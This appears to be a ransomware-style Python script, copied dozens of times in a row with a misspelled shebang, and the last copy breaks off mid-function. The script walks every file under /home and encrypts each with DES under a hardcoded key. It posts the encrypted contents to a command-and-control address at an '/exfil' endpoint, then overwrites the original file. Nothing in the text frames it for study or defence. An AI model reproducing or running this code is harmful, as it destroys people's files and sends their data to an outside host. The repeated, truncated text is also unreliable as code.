import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
